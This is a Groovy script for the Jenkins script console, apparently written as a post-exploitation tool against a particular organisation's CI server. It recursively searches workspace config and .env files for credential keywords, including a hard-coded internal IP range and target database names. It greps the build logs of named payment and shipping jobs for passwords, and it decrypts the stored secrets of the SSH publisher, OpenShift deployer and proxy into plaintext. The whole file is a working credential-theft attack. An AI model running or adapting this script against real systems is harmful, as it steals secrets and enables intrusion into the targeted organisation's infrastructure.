// Busca credenciales en workspaces activos y logs de builds recientes

println "=== WORKSPACE CONTENT SCAN ==="

def WS_ROOT = "/var/jenkins_home/workspace"
def interesting_files = [".env", "config.php", "database.php", ".env.example", 
                          ".env.production", "config.yml", "database.yml",
                          "wp-config.php", "parameters.yml", "config.json",
                          ".env.dev", ".env.qa", ".env.production",
                          "docker-compose.yml", "docker-compose.prod.yml"]

def interestingKeywords = ["DB_HOST", "DB_PASS", "MYSQL_HOST", "DATABASE_HOST", 
                           "DB_PASSWORD", "172.27.141", "dbasears", "sears", 
                           "password", "passwd", "secret", "credential"]

new File(WS_ROOT).eachDir { wsDir ->
    wsDir.eachFileRecurse { f ->
        if (f.isFile() && f.length() < 50000) {
            def name = f.name.toLowerCase()
            if (interesting_files.any { name == it || name.endsWith(it) } ||
                name.endsWith('.env') || name.contains('config') || name.contains('database')) {
                try {
                    def content = f.text
                    def hasKeyword = interestingKeywords.any { kw -> 
                        content.toLowerCase().contains(kw.toLowerCase())
                    }
                    if (hasKeyword) {
                        println "\n=== FILE: ${f.absolutePath} ==="
                        content.split("\n").each { line ->
                            if (interestingKeywords.any { kw -> line.toLowerCase().contains(kw.toLowerCase()) }) {
                                println "  ${line.trim().take(300)}"
                            }
                        }
                    }
                } catch(e) { }
            }
        }
    }
}

println "\n=== BUILD LOGS SCAN (last 5 builds per job with SSH) ==="
def TARGET_JOB_KEYWORDS = ["t1pagos", "t1envios", "plataforma-claro", "caja-ng", "carritoms"]

jenkins.model.Jenkins.getInstance().getAllItems().findAll { job ->
    TARGET_JOB_KEYWORDS.any { kw -> job.fullName.toLowerCase().contains(kw) }
}.take(10).each { job ->
    println "\nJOB: ${job.fullName}"
    job.builds?.take(3)?.each { build ->
        println "  Build #${build.number} (${build.result})"
        try {
            def logReader = build.getLogReader()
            def log = new java.io.BufferedReader(logReader)
            def line
            def count = 0
            while ((line = log.readLine()) != null && count < 500) {
                if (line.contains("DB_") || line.contains("MYSQL") || 
                    line.contains("172.27.141") || line.contains("password") ||
                    line.contains("credential") || line.contains("dbasears")) {
                    println "    LOG: ${line.trim().take(200)}"
                }
                count++
            }
        } catch(e) { println "    Log error: ${e.message}" }
    }
}

println "\n=== SSH PUBLISHER PLUGIN - DECRYPT PASSWORDS ==="
// The BapSshPublisher plugin stores encrypted passwords
// Jenkins master key can decrypt them
try {
    def conf = new File("/var/jenkins_home/jenkins.plugins.publish_over_ssh.BapSshPublisherPlugin.xml").text
    def encPasses = (conf =~ /<secretPassword>\{([^}]+)\}<\/secretPassword>/)
    encPasses.each { m ->
        def enc = "{${m[1]}}"
        try {
            def dec = hudson.util.Secret.fromString(enc).getPlainText()
            println "DECRYPTED SSH password: ${dec}"
        } catch(e) {
            println "Decrypt failed for: ${enc.take(50)}"
        }
    }
} catch(e) {
    println "Decrypt error: ${e.message}"
}

println "\n=== OPENSHIFT DEPLOYER PASSWORD ==="
try {
    def conf = new File("/var/jenkins_home/org.jenkinsci.plugins.openshift.DeployApplication.xml").text
    def encPass = (conf =~ /<password>\{([^}]+)\}<\/password>/)
    encPass.each { m ->
        def enc = "{${m[1]}}"
        try {
            def dec = hudson.util.Secret.fromString(enc).getPlainText()
            println "OpenShift password: ${dec}"
        } catch(e) {
            println "Decrypt failed"
        }
    }
} catch(e) { println "Error: ${e.message}" }

println "\n=== PROXY PASSWORD ==="
try {
    def conf = new File("/var/jenkins_home/proxy.xml").text
    def encPass = (conf =~ /<secretPassword>\{([^}]+)\}<\/secretPassword>/)
    encPass.each { m ->
        def enc = "{${m[1]}}"
        try {
            def dec = hudson.util.Secret.fromString(enc).getPlainText()
            println "Proxy password: ${dec}"
        } catch(e) { }
    }
} catch(e) { }
